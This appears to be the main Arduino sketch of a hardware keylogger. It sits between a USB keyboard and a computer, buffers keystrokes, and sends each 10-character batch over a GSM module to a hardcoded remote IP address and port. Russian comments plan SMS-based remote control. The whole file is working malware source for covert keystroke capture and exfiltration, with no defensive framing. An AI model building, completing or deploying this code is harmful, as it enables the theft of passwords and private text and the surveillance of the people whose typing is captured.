// ============================================================================
#include "gsm.h"
#include "keyboard.h"
// ============================================================================
SoftwareGSM *gsm;
// ============================================================================
USB usb;
HIDBoot<USB_HID_PROTOCOL_KEYBOARD> hid_keyboard(&usb);
KeyboardParser keyboard_prs;
const uint8_t MAX_BUFFER_SIZE = 10;
// ============================================================================
void traffic_analyze(SoftwareGSM *gsm_module) {
	if (keyboard_prs.buffer.length() >= MAX_BUFFER_SIZE) {
		Keyboard.releaseAll();
		gsm_module->send_answer(keyboard_prs.buffer);
		Serial.print(F("[GSM] SEND: "));
		Serial.println(keyboard_prs.buffer.c_str());
		keyboard_prs.buffer = "";
	}
}
// ============================================================================
void setup() {
	Serial.begin(DEFAULT_SERIAL_PORT);
	digitalWrite(DEFUALT_POWER_PIN, HIGH);

	gsm = new SoftwareGSM();
	gsm->cfg();
	gsm->connect_to_server(FF(F("31.207.78.188")), FF(F("8082")));

    Keyboard.begin();
	if (usb.Init() == -1) Serial.println(F("[ERROR] OSC did not start."));
	hid_keyboard.SetReportParser(0, &keyboard_prs);

	Serial.println(F("[GSM] module started."));
	viewFreeMemory();

	keyboard_prs.buffer = "";
}
// ============================================================================
void loop() {
	traffic_analyze(gsm);
	gsm->execute();
	usb.Task();

	// TODO: реализовать удаленный контроль модуля через смс.
	// (перезапуск, немедленная отправка данных, ответ на смс)
	// TODO: реализовать возможность подключения к серверу через смс
	// (отправка текста с ключ. словом и айпи адресом)
}
// ============================================================================
